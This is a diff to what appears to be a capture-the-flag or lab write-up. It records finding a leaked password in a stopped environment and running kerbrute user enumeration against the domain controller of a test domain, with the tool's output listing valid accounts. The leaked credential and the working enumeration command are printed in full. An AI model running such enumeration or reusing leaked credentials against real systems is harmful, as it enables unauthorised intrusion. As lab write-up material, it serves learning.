@@ -237,4 +237,35 @@ I have found another Project
 
 ![](Pasted%20image%2020260805171412.png)
 
-Using the operate tab on the left i find a stopped environment which ones agains leaks cr
+Using the operate tab on the left i find a stopped environment which ones agains leaks credentials!
+
+```python
+fFvq52PzJpO98X8!
+```
+
+I am not given a username so ill use kerbrute to try an enumerate some users
+
+```python
+kerbrute userenum --dc dc01.casper.hsm -d casper.hsm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/05/26 - Ronnie Flathers @ropnop
+
+2026/08/05 16:53:52 >  Using KDC(s):
+2026/08/05 16:53:52 >  	dc01.casper.hsm:88
+
+2026/08/05 16:54:04 >  [+] VALID USERNAME:	jay@casper.hsm
+2026/08/05 16:54:10 >  [+] VALID USERNAME:	administrator@casper.hsm
+2026/08/05 16:54:18 >  [+] VALID USERNAME:	carlito@casper.hsm
+2026/08/05 16:55:02 >  [+] VALID USERNAME:	Jay@casper.hsm
+2026/08/05 16:55:28 >  [+] VALID USERNAME:	points@casper.hsm
+2026/08/05 16:55:39 >  [+] VALID USERNAME:	JAY@casper.hsm
+2026/08/05 16:56:08 >  [+] VALID USERNAME:	Administrator@casper.hsm
+```
+
+Found user `jay` `carlito` 
